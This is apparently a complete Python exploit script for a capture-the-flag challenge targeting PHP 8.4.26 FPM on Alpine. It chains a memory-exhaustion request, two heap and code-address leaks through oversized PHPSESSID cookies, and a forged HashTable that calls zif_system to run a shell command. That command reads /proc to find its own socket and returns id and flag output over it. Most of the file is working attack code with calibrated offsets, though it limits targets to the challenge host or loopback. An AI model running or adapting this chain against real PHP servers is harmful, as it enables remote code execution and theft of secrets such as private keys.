#!/usr/bin/env python3
"""Proof of concept for the Steal My Bitcoin PHP 8.4.26 CTF.

The attack runs in four stages, each one feeding the next:

  1. EXHAUST   A multipart upload-progress request walks PHP into its 128 MiB
               memory limit. The wire body is only ~249 KiB; deeply nested
               field names do the amplifying during request parsing. The OOM
               leaves stale session state behind in a worker that gets reused.
  2. HEAP LEAK Eight pipelined consumers race for that worker. One comes back
               with a 256-byte PHPSESSID holding neighbouring heap bytes, which
               give up the Zend heap chunk base.
  3. CODE LEAK A second producer/consumer batch does the same trick with a
               different array shape and discloses zval_ptr_dtor, which locates
               the PHP code image.
  4. CALLBACK  One final multipart request plants a forged HashTable at a
               calculated heap address. PHP's cleanup path reads its
               pDestructor as zif_system and calls it with our command.

Both addresses have to come from the current run: ASLR moves the heap and the
code image independently, and a stale pointer just makes the attempt fail.

The offsets and multipart shapes are calibrated for the challenge's observed
Alpine PHP 8.4.26 layout. A matching low 21-bit code pointer is a useful
fingerprint, not proof that every remote ELF byte matches. Workers can die or
change between stages, so a single attempt may fail.

The original successful command called print-flag once. This version prefixes
it with a fresh nonce, id, and a binary hash so the response carries its own
execution evidence.

Standard library only. The run directory holds raw HTTP and may contain a
private WIF, so publish this source file, not a run's output directory.

    python stealmybitcoin_poc.py --url https://stealmybitcoin.com/php-version.php
"""

from __future__ import annotations

import argparse
import collections
import datetime as dt
import hashlib
import http.client
import json
import re
import secrets
import socket
import ssl
import struct
import sys
import urllib.parse
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

# ---------------------------------------------------------------------------
# Calibration
#
# These describe the one PHP build and heap layout observed in the challenge.
# They are not a generic PHP exploit configuration, and changing the server
# image, its memory settings, or its worker count invalidates them.
# ---------------------------------------------------------------------------

PHP_VERSION = "PHP/8.4.26"

COOKIE_BOUNDARY = b"COOKIE-LAB-BOUNDARY"
FINAL_BOUNDARY = b"h" * 10
BODY_LIMIT = 1 << 20           # challenge caps a single multipart body at 1 MiB
MAX_RESPONSE_BYTES = 1 << 17   # stop reading rather than trust Content-Length
CONSUMERS = 8                  # pipelined behind each producer
COOKIE_PAIRS = 1001            # empty cookie names carried by every producer

# Zend allocates in aligned 2 MiB chunks, so a chunk base is a pointer with the
# low 21 bits cleared. Several pointers agreeing on one base is the leak signal.
CHUNK_MASK = (1 << 21) - 1
MIN_POINTER_AGREEMENT = 4

# Plausible address windows under this kernel's ASLR. Anything outside these is
# noise rather than a leak.
HEAP_MIN, HEAP_MAX = 0x700000000000, 0x800000000000
CODE_MIN, CODE_MAX = 0x500000000000, 0x700000000000

@dataclass(frozen=True)
class BuildProfile:
    """One PHP binary layout that these constants were calibrated on.

    Text offsets differ per build, so a run against any other build cannot work.
    Keep this list small and measured; do not guess entries.
    """

    name: str
    dtor_low21: int             # low 21 bits of zval_ptr_dtor; ASLR does not move it
    zif_system_from_dtor: int   # zif_system - zval_ptr_dtor
    heap_carrier_delta: int     # chunk base -> controlled hold value, measured with four workers
    heap_carrier_offset: int


SUPPORTED_BUILDS = (
    BuildProfile(name="php:8.4.26-fpm-alpine3.23",
                 dtor_low21=0x112930,
                 zif_system_from_dtor=-0x204BC0,
                 heap_carrier_delta=0x8400000,
                 heap_carrier_offset=0x16D1D8),
)
PROFILE = SUPPORTED_BUILDS[0]

# Fingerprint and offsets measured against the local Alpine PHP 8.4.26 image.
DTOR_LOW21 = PROFILE.dtor_low21
ZIF_SYSTEM_FROM_DTOR = PROFILE.zif_system_from_dtor

# Distance from the leaked chunk base to the controlled "hold" field, measured
# in a local four-worker Alpine setup.
HEAP_CARRIER_DELTA = PROFILE.heap_carrier_delta
HEAP_CARRIER_OFFSET = PROFILE.heap_carrier_offset

# The forged structure is one 384-byte multipart value; the command lives
# inside it after the HashTable, call frame, and zend_string headers.
CARRIER_SIZE = 384
COMMAND_OFFSET = 0x98
COMMAND_LIMIT = CARRIER_SIZE - COMMAND_OFFSET - 1  # 231, leaving a NUL terminator

ORDINARY_COOKIE_BYTES = 32  # what a healthy PHPSESSID looks like


# ---------------------------------------------------------------------------
# Target
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Target:
    """The allowed challenge URL or an explicitly chosen loopback lab."""

    scheme: str
    host: str
    port: int
    path: str

    @property
    def host_header(self) -> str:
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"

    def connect(self) -> socket.socket:
        tcp = socket.create_connection((self.host, self.port), timeout=20)
        if self.scheme == "https":
            try:
                tcp = ssl.create_default_context().wrap_socket(
                    tcp, server_hostname=self.host)
            except BaseException:
                tcp.close()
                raise
        tcp.settimeout(20)
        return tcp


def parse_target(url: str) -> Target:
    """Keep accidental executions away from unrelated sites and services.

    This is the only thing standing between a typo and an unauthorized
    memory-exhaustion request, so it is deliberately strict.
    """
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("--url must be an absolute HTTP(S) URL")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("--url cannot contain credentials, query, or fragment")
    if parsed.hostname not in ("stealmybitcoin.com", "localhost", "127.0.0.1"):
        raise ValueError("This CTF PoC accepts only the challenge or a loopback lab")
    if parsed.hostname == "stealmybitcoin.com":
        if parsed.path != "/php-version.php":
            raise ValueError("The challenge target must be /php-version.php")
        if parsed.scheme != "https":
            raise ValueError("The challenge target must use HTTPS")
        if parsed.port not in (None, 443):
            raise ValueError("The challenge target must use HTTPS port 443")
    return Target(parsed.scheme, parsed.hostname,
                  parsed.port or (443 if parsed.scheme == "https" else 80),
                  parsed.path or "/")


# ---------------------------------------------------------------------------
# Multipart building blocks
# ---------------------------------------------------------------------------

def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def multipart_part(boundary: bytes, name: bytes, value: bytes = b"",
                   filename: bytes | None = None) -> bytes:
    header = (b"--" + boundary +
              b'\r\nContent-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        header += b'; filename="' + filename + b'"'
    return header + b"\r\n\r\n" + value + b"\r\n"


def finish_multipart(parts: list[bytes], boundary: bytes) -> bytes:
    """Close a multipart body and enforce the challenge's 1 MiB wire cap."""
    body = b"".join(parts) + b"--" + boundary + b"--\r\n"
    if not 0 < len(body) < BODY_LIMIT:
        raise ValueError(f"Multipart body is outside the 1 MiB cap: {len(body)}")
    return body


# ---------------------------------------------------------------------------
# Stage 1: exhaust PHP's memory limit
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class ProducerShape:
    """Nested-name geometry that decides how much memory parsing will burn.

    `count` file controls are named f[i][x][x]... with `depth` nested segments.
    Those names cost a few dozen bytes each on the wire but build a tree of
    nested PHP arrays in memory, which is what overshoots the 128 MiB limit.
    The two stages use slightly different shapes because each one has to leave
    the worker in a different allocation state.
    """

    depth: int
    count: int
    field_count: int
    field_value_size: int


def leak_producer(shape: ProducerShape) -> bytes:
    """Make PHP run out of memory while parsing session upload progress.

    The NUL PHPSESSID and the upload-progress field are what drag PHP's session
    code into the request-parsing path, so the OOM happens with session state
    half-built. That half-built state is the whole point: it is what the
    consumers go after.
    """
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, f"p{i:04d}".encode(), b"x" * shape.field_value_size)
             for i in range(shape.field_count)]
    parts += [multipart_part(b, b"PHPSESSID", b"\x00"),
              multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
              multipart_part(b, b"f", b"A" * 64, b"a.txt")]
    for i in range(shape.count):
        name = b"f[" + str(i).encode() + b"]" + b"[x]" * shape.depth
        parts.append(multipart_part(b, name, filename=b""))
    return finish_multipart(parts, b)


# ---------------------------------------------------------------------------
# Stage 2: leak a Zend heap chunk base
# ---------------------------------------------------------------------------

def heap_consumer() -> bytes:
    """Reclaim stale session data and turn it into a 256-byte cookie leak."""
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, b"PHPSESSID", b"a"),
             multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(51):
        value = (f"v{i:04d}".encode() + b"x" * 48)[:48]
        parts.append(multipart_part(b, str(1000 + i).encode(), value))
    # Repeating numeric key 1050 changes the array's allocation pattern so the
    # crafted value below lands on the stale string header.
    parts.append(multipart_part(b, b"1050", b"Z" * 128))
    # Overwrite that header's length field with 256. PHP then serialises 256
    # bytes of whatever follows it in memory into the PHPSESSID cookie.
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, 256)
    forged[0x18] = ord("L")
    parts.append(multipart_part(b, b"1999", bytes(forged)))
    return finish_multipart(parts, b)


def heap_candidate(cookie: bytes) -> int | None:
    """Recover one chunk base, or None if the cookie is not convincing.

    The leaked bytes are not aligned for us, so every byte offset is tried.
    Requiring several pointers to agree on the same aligned chunk is what
    separates a real leak from coincidental ASCII.
    """
    if len(cookie) != 256:
        return None
    candidates = []
    for alignment in range(8):
        words = (struct.unpack_from("<Q", cookie, pos)[0]
                 for pos in range(alignment, len(cookie) - 7, 8))
        counts = collections.Counter(value & ~CHUNK_MASK for value in words
                                     if HEAP_MIN <= value < HEAP_MAX)
        if counts:
            base, hits = counts.most_common(1)[0]
            candidates.append((hits, alignment, base))
    if not candidates:
        return None
    hits, _alignment, base = max(candidates)
    return base if hits >= MIN_POINTER_AGREEMENT else None


# ---------------------------------------------------------------------------
# Stage 3: leak zval_ptr_dtor from the PHP code image
# ---------------------------------------------------------------------------

def code_consumer() -> bytes:
    """Shape the reused worker's allocations to disclose zval_ptr_dtor."""
    b = COOKIE_BOUNDARY
    parts = [multipart_part(b, b"PHPSESSID", b"a"),
             multipart_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(73):
        parts.append(multipart_part(b, f"s{i:04d}".encode(), b"P" * 24))
    # One 16-element array at position 69 is the calibration that exposed the
    # code pointer in a 16-byte PHPSESSID value in the observed Alpine build.
    for i in range(983 - 73):
        for j in range(16 if i == 69 else 1):
            parts.append(multipart_part(b, f"a{i:04d}[{j}]".encode(), b"x" * 16))
    return finish_multipart(parts, b)


def describe_supported_builds() -> str:
    """One line that names every calibrated build and its fingerprint."""
    names = ", ".join(f"{profile.name} (low21 0x{profile.dtor_low21:x})"
                      for profile in SUPPORTED_BUILDS)
    return f"This PoC is calibrated for: {names}. Other builds have different text offsets."


def code_candidate(cookie: bytes) -> int | None:
    """Require the 16-byte cookie and the observed Alpine code fingerprint.

    The low 21 bits of a function pointer are its page offset, which ASLR does
    not move. Matching DTOR_LOW21 says the remote image is laid out like the
    one that was measured locally. It is a strong hint, not an identity check.
    """
    if len(cookie) != 16 or struct.unpack_from("<Q", cookie)[0] != 16:
        return None
    value = struct.unpack_from("<Q", cookie, 8)[0]
    if CODE_MIN <= value < CODE_MAX and value & CHUNK_MASK == DTOR_LOW21:
        return value
    return None


# ---------------------------------------------------------------------------
# The two leak stages, described in one place
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class LeakStage:
    """Everything that differs between the heap stage and the code stage."""

    name: str
    producer: ProducerShape
    build_consumer: Callable[[], bytes]
    read_candidate: Callable[[bytes], int | None]
    leak_cookie_bytes: int
    describes: str


STAGES = {
    "heap": LeakStage(
        name="heap",
        producer=ProducerShape(depth=57, count=950, field_count=50,
                               field_value_size=1),
        build_consumer=heap_consumer,
        read_candidate=heap_candidate,
        leak_cookie_bytes=256,
        describes="Zend chunk base",
    ),
    "code": LeakStage(
        name="code",
        producer=ProducerShape(depth=58, count=935, field_count=65,
                               field_value_size=39),
        build_consumer=code_consumer,
        read_candidate=code_candidate,
        leak_cookie_bytes=16,
        describes="zval_ptr_dtor",
    ),
}


# ---------------------------------------------------------------------------
# Stage 4: forge a HashTable and reach zif_system
# ---------------------------------------------------------------------------

def fake_hashtable(address: int, zif_system: int, command: bytes) -> bytes:
    """Build the 384-byte HashTable / execute_data / zend_string overlap.

    Three structures share one buffer. PHP's cleanup path reads the HashTable's
    pDestructor and calls it; we point that at zif_system. The first bucket sits
    where a call frame's arguments would be, so zif_system finds the zend_string
    below as its single argument. Byte layout is specific to 64-bit PHP 8.4.26.

    `address` is where this buffer will live in the remote process, which is why
    the internal pointers are absolute rather than relative.
    """
    if b"\x00" in command:
        raise ValueError("Command cannot contain a NUL byte")
    if len(command) > COMMAND_LIMIT:
        raise ValueError(
            f"Command is {len(command)} bytes; the carrier holds {COMMAND_LIMIT}")

    data = bytearray(CARRIER_SIZE)

    # zend_array header.
    struct.pack_into("<II", data, 0x00, 1, 7)              # gc, IS_ARRAY
    struct.pack_into("<II", data, 0x08, 0x10, 0xFFFFFFF8)  # flags, mask
    struct.pack_into("<Q", data, 0x10, address + 0x20)     # arData -> bucket
    struct.pack_into("<II", data, 0x18, 1, 1)              # used, elements
    struct.pack_into("<II", data, 0x20, 8, 0)              # size, pointer
    struct.pack_into("<Q", data, 0x28, 0)                  # next free
    struct.pack_into("<Q", data, 0x30, zif_system)         # pDestructor

    # Same bytes reinterpreted as the fake execute_data at address + 0x20. The
    # opline write below deliberately clears the size field above: the two
    # structures overlap, and the execute_data reading is the one that matters.
    struct.pack_into("<Q", data, 0x20, 0)                  # opline
    struct.pack_into("<Q", data, 0x30, zif_system)         # return_value
    struct.pack_into("<I", data, 0x4C, 1)                  # num_args
    struct.pack_into("<Q", data, 0x70, address + 0x80)     # arg1 -> zend_string
    struct.pack_into("<I", data, 0x78, 6)                  # arg1 type IS_STRING

    # zend_string holding the command, NUL terminated.
    struct.pack_into("<II", data, 0x80, 1, 0x106)          # gc, flags
    struct.pack_into("<Q", data, 0x90, len(command))       # length
    data[COMMAND_OFFSET:COMMAND_OFFSET + len(command)] = command
    data[COMMAND_OFFSET + len(command)] = 0
    return bytes(data)


def final_multipart(heap_base: int, dtor: int, command: bytes) -> bytes:
    """Place the fake table and trigger the final cleanup callback.

    Both addresses are re-validated here rather than trusted from the leak
    stages: writing a forged pointer to a wrong address is the one step that
    could crash a worker for no gain.
    """
    if heap_base & CHUNK_MASK or not HEAP_MIN <= heap_base < HEAP_MAX:
        raise ValueError("Heap address is not a plausible aligned Zend chunk")
    if not (CODE_MIN <= dtor < CODE_MAX and dtor & CHUNK_MASK == DTOR_LOW21):
        raise ValueError(
            "Code address does not match the calibrated layout. "
            + describe_supported_builds()
            + f" Measured low 21 bits: 0x{dtor & CHUNK_MASK:x}.")

    # The leak gives a chunk base; the controlled "hold" value lands at this
    # calibrated distance from it.
    target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET
    forged = fake_hashtable(target, dtor + ZIF_SYSTEM_FROM_DTOR, command)

    b = FINAL_BOUNDARY
    parts = []
    for i in range(1000):
        name = b"f[" + str(i).encode() + b"]" + b"[x]" * 54
        parts.append(multipart_part(b, name, filename=b""))
    # Slot 13 of this primer supplies the pointer consumed during the final OOM
    # cleanup. Order matters below: "hold" must be allocated and filled with the
    # forged table before the long field name triggers that OOM.
    primer = bytearray(b"Q" * 276)
    struct.pack_into("<Q", primer, 13 * 8, target)
    parts += [multipart_part(b, b"", bytes(primer)),
              multipart_part(b, b"a", b"1"),
              multipart_part(b, b"hold", forged),
              multipart_part(b, b"K" * 128000 + b"[x]", b"1")]
    return finish_multipart(parts, b)


def proof_command(nonce: str) -> bytes:
    """Send a nonce, id, binary digest, and one flag output to the active socket.

    zif_system's stdout does not reach the HTTP response, so the command locates
    its own accepted TCP socket by matching the listening inode from /proc/net
    against /proc/self/fd, then redirects everything to that descriptor.

    The nonce and digest exist so the response proves itself: a nonce chosen
    microseconds earlier cannot have come from a replayed or cached body.
    """
    command = (
        "i=$(awk '$4==\"01\"{print $10;exit}' /proc/net/tcp*);"
        "f=5;for x in /proc/self/fd/*;do "
        "[ \"$(readlink \"$x\")\" = \"socket:[$i]\" ]&&f=${x##*/};done;"
        f'eval "{{ echo {nonce};id;sha256sum \\"$(which print-flag)\\";'
        'print-flag;}>&$f 2>&$f"'
    ).encode("ascii")
    if len(command) > COMMAND_LIMIT:
        raise ValueError("Proof command does not fit the carrier")
    if command.count(b";print-flag;") != 1:
        raise ValueError("Proof command must invoke print-flag exactly once")
    return command


# ---------------------------------------------------------------------------
# HTTP plumbing
# ---------------------------------------------------------------------------

def cookie_name(index: int) -> str:
    """Two-character names, distinct for every index below 1296."""
    alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
    return alphabet[(index // 36) % 36] + alphabet[index % 36]


def http_frame(target: Target, body: bytes, boundary: bytes, *,
               cookie_pairs: int = 0, close: bool = True) -> bytes:
    """Format a producer or consumer exactly as the live runner did.

    Header order and the empty cookie list are part of the calibration, so these
    frames are built by hand instead of through http.client.
    """
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Connection: close" if close else "Connection: keep-alive",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary=" + boundary.decode("ascii")]
    if cookie_pairs:
        lines.append("Cookie: " + "".join(
            cookie_name(i) + "=;" for i in range(cookie_pairs)))
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


def final_http_frame(target: Target, body: bytes) -> bytes:
    """Match the original http.client header order in the final request."""
    lines = [f"POST {target.path} HTTP/1.1",
             f"Host: {target.host_header}",
             "Accept-Encoding: identity",
             f"Content-Length: {len(body)}",
             "Content-Type: multipart/form-data; boundary="
             + FINAL_BOUNDARY.decode("ascii"),
             "Connection: close"]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


class RecordingReader:
    """Collect plaintext response bytes while http.client parses them.

    close() is a no-op on purpose: http.client closes its file after each
    response, but the pipelined stages need the stream to survive all nine.
    """

    def __init__(self, reader):
        self.reader = reader
        self.chunks: list[bytes] = []

    def read(self, *args, **kwargs):
        value = self.reader.read(*args, **kwargs)
        self.chunks.append(value)
        return value

    def readline(self, *args, **kwargs):
        value = self.reader.readline(*args, **kwargs)
        self.chunks.append(value)
        return value

    def close(self):
        pass

    def flush(self):
        """http.client calls this when it writes through the file object."""
        pass


class SharedSocket:
    """Hand the same stream to every HTTPResponse built from one connection."""

    def __init__(self, reader):
        self.reader = reader

    def makefile(self, *_args, **_kwargs):
        return self.reader


def receive(shared: SharedSocket) -> tuple[dict, bytes, bytes]:
    """Read one response from a shared pipelined stream and decode PHPSESSID."""
    response = http.client.HTTPResponse(shared)
    response.begin()
    body = response.read(MAX_RESPONSE_BYTES)
    set_cookie = response.getheader("Set-Cookie") or ""
    encoded = (set_cookie.split("PHPSESSID=", 1)[1].split(";", 1)[0]
               if "PHPSESSID=" in set_cookie else "")
    cookie = urllib.parse.unquote_to_bytes(encoded.replace("+", " "))
    record = {"status": response.status,
              "powered_by": response.getheader("X-Powered-By"),
              "response_bytes": len(body), "body_sha256": sha256(body),
              "oom": b"Allowed memory size" in body and b"exhausted" in body,
              "cookie_bytes": len(cookie)}
    return record, cookie, body


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def preflight(target: Target) -> None:
    """Check the version page before any memory-limit request is sent."""
    cls = (http.client.HTTPSConnection if target.scheme == "https"
           else http.client.HTTPConnection)
    connection = cls(target.host, target.port, timeout=12)
    try:
        connection.request("GET", target.path, headers={"Connection": "close"})
        response = connection.getresponse()
        body = response.read(4096)
        if (response.status != 200
                or response.getheader("X-Powered-By") != PHP_VERSION
                or not body.startswith(b"PHP 8.4.26\n")):
            raise RuntimeError("Target did not return the expected PHP 8.4.26 version page")
    finally:
        connection.close()


def run_leak_stage(target: Target, stage: LeakStage, output: Path) -> tuple[int, dict]:
    """Send one OOM producer plus eight consumers on one connection.

    The consumers are written before any response is read, which narrows the
    window in which another request could take the poisoned worker. The cost is
    that they cannot be withdrawn once queued, so the guards at the end exist to
    stop a *later* stage from running on a bad result rather than to undo this
    one. Every file is written before validation so a failed run still leaves
    usable evidence behind.
    """
    producer = leak_producer(stage.producer)
    consumer = stage.build_consumer()

    # One sendall carrying nine HTTP requests. Each individual body stays under
    # the 1 MiB cap even though the combined write is larger.
    request = http_frame(target, producer, COOKIE_BOUNDARY,
                         cookie_pairs=COOKIE_PAIRS, close=False)
    request += b"".join(http_frame(target, consumer, COOKIE_BOUNDARY,
                                   close=index == CONSUMERS - 1)
                        for index in range(CONSUMERS))
    (output / f"{stage.name}.request.http").write_bytes(request)

    responses: list[dict] = []
    candidates: set[int] = set()
    raw = b""
    try:
        with target.connect() as connection:
            stream = connection.makefile("rb")
            reader = RecordingReader(stream)
            try:
                connection.sendall(request)
                shared = SharedSocket(reader)
                for _ in range(CONSUMERS + 1):
                    record, cookie, _body = receive(shared)
                    responses.append(record)
                    # The producer's own cookie is never a leak; parsing it is
                    # harmless and keeps this loop uniform.
                    value = stage.read_candidate(cookie)
                    if value is not None:
                        candidates.add(value)
            finally:
                raw = b"".join(reader.chunks)
                stream.close()
    finally:
        (output / f"{stage.name}.response.http").write_bytes(raw)

    result = {"stage": stage.name,
              "producer": responses[0] if responses else None,
              "consumers": responses[1:],
              "candidate_addresses": [hex(x) for x in sorted(candidates)],
              "request_sha256": sha256(request),
              "response_sha256": sha256(raw)}
    (output / f"{stage.name}.json").write_text(json.dumps(result, indent=2) + "\n")

    if len(responses) != CONSUMERS + 1:
        raise RuntimeError(f"{stage.name}: incomplete response batch")
    producer_record = responses[0]
    if (producer_record["status"] != 200
            or producer_record["powered_by"] != PHP_VERSION
            or producer_record["oom"] is not True):
        raise RuntimeError(f"{stage.name}: producer did not return PHP 8.4.26 HTTP 200 OOM")
    # An ordinary 32-byte cookie just means this consumer missed; any other
    # length means the worker is in a state we do not understand.
    allowed = (ORDINARY_COOKIE_BYTES, stage.leak_cookie_bytes)
    for index, consumer_record in enumerate(responses[1:], 1):
        if (consumer_record["status"] != 200
                or consumer_record["powered_by"] != PHP_VERSION
                or consumer_record["cookie_bytes"] not in allowed):
            raise RuntimeError(f"{stage.name}: consumer {index} did not return a valid cookie")
    if len(candidates) != 1:
        raise RuntimeError(
            f"{stage.name}: expected one strict address, found {len(candidates)}")
    return candidates.pop(), result


def final_request(target: Target, heap: int, dtor: int,
                  nonce: str, output: Path) -> dict:
    """Send the one forged callback request and retain its actual HTTP bytes.

    The reply is read to its declared length or final chunk, so a server that
    holds the connection open cannot stall this forever. The saved body can
    contain the challenge's private key; the JSON beside it holds only hashes
    and yes/no checks. Nothing here claims a returned WIF controls the
    advertised prize address, which is a separate question entirely.
    """
    command = proof_command(nonce)
    body = final_multipart(heap, dtor, command)
    request = final_http_frame(target, body)
    (output / "final.request.http").write_bytes(request)

    raw = b""
    response_body = b""
    status = None
    headers: list[tuple[str, str]] = []
    incomplete = False
    try:
        with target.connect() as connection:
            stream = connection.makefile("rb")
            reader = RecordingReader(stream)
            try:
                connection.sendall(request)
                response = http.client.HTTPResponse(SharedSocket(reader))
                response.begin()
                status = response.status
                headers = response.getheaders()
                try:
                    response_body = response.read(MAX_RESPONSE_BYTES)
                except http.client.IncompleteRead as exc:
                    response_body = exc.partial
                    incomplete = True
            finally:
                raw = b"".join(reader.chunks)
                stream.close()
    finally:
        (output / "final.response.http").write_bytes(raw)
    (output / "final.response.body").write_bytes(response_body)
    (output / "final.response.headers.json").write_text(
        json.dumps({"status": status, "headers": headers}, indent=2) + "\n")

    # Three independent markers. All of them have to appear in one intact
    # response before the run counts as proven.
    nonce_seen = nonce.encode() in response_body
    id_seen = re.search(rb"\buid=\d+", response_body) is not None
    binary_hash_seen = re.search(
        rb"\b[0-9a-f]{64}\s+\S*print-flag\b", response_body) is not None
    truncated = len(response_body) >= MAX_RESPONSE_BYTES

    result = {"status": status,
              "nonce_seen": nonce_seen,
              "id_seen": id_seen,
              "binary_hash_seen": binary_hash_seen,
              "response_incomplete": incomplete or truncated,
              "execution_proof_verified": bool(
                  status == 200 and nonce_seen and id_seen and binary_hash_seen
                  and not incomplete and not truncated),
              "request_bytes": len(request), "request_sha256": sha256(request),
              "response_bytes": len(raw), "response_sha256": sha256(raw),
              "response_body_bytes": len(response_body),
              "response_body_sha256": sha256(response_body),
              "response_path": str(output / "final.response.http")}
    (output / "final.json").write_text(json.dumps(result, indent=2) + "\n")
    return result


def main() -> int:
    """Run one bounded attempt: health check, two leak stages, one callback."""
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", help="Exact challenge or loopback version endpoint")
    parser.add_argument("--output-dir", type=Path,
                        help="Directory for raw HTTP and stage metadata")
    args = parser.parse_args()
    if not args.url:
        parser.print_help()
        return 0

    try:
        target = parse_target(args.url)
    except ValueError as exc:
        print(f"[abort] {exc}", file=sys.stderr, flush=True)
        return 1

    stamp = dt.datetime.now(dt.UTC).strftime("%Y%m%dT%H%M%S%fZ")
    output = args.output_dir or Path(f"poc-run-{stamp}")
    output.mkdir(parents=True, exist_ok=False)

    result: dict = {"target": args.url,
                    "started_utc": dt.datetime.now(dt.UTC).isoformat(),
                    "stage_order": ["health", "heap", "code", "final"],
                    "consumer_count": CONSUMERS,
                    "output_dir": str(output)}
    try:
        preflight(target)
        print("[health] PHP 8.4.26 confirmed", flush=True)
        print(f"[health] calibrated for {PROFILE.name}; "
              f"other builds cannot pass the code-leak check", flush=True)

        heap, result["heap"] = run_leak_stage(target, STAGES["heap"], output)
        print(f"[heap] strict Zend base {heap:#x}", flush=True)

        dtor, result["code"] = run_leak_stage(target, STAGES["code"], output)
        print(f"[code] strict zval_ptr_dtor {dtor:#x}", flush=True)

        nonce = secrets.token_hex(8)
        final = final_request(target, heap, dtor, nonce, output)
        result["final"] = final
        print(json.dumps({"stage": "final", "nonce": nonce,
                          "execution_proof_verified": final["execution_proof_verified"],
                          "response_path": final["response_path"]}), flush=True)
        return 0 if final["execution_proof_verified"] else 1
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
        print(f"[abort] {result['error']}", file=sys.stderr, flush=True)
        return 1
    finally:
        result["completed_utc"] = dt.datetime.now(dt.UTC).isoformat()
        (output / "run.json").write_text(json.dumps(result, indent=2) + "\n")


if __name__ == "__main__":
    raise SystemExit(main())
